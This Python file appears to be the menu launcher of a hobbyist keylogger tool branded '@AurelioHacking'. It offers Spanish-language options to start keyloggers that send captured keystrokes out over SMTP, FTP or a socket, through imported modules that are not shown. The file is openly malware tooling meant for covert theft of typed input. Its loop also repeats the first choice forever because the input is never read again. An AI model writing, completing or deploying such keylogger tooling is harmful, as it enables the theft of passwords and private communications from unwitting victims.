from pyfiglet import Figlet
import os
from smtp_keylogger import keysmtp
from ftp_keylogger import keyftp
from socket_keylogger import keysocket


def menu():
    os.system("cls")
    f = Figlet(font='slant')
    print("\n\n")
    print (f.renderText('    KEYLOGGER    @AurelioHacking'))
    print("  [1] Keylogger por SMTP")
    print("  [2] Keylogger por FTP")
    print("  [3] Keylogger por Socket")

menu()
option = int(input("\n  Ingresa tu opcion: "))

while option != 0:
    if option == 1:
        os.system("cls")
        keysmtp()
    elif option == 2:
        os.system("cls")
        keyftp()
    elif option == 3:
        os.system("cls")
        keysocket()
    else:
        print("Opcion invalida")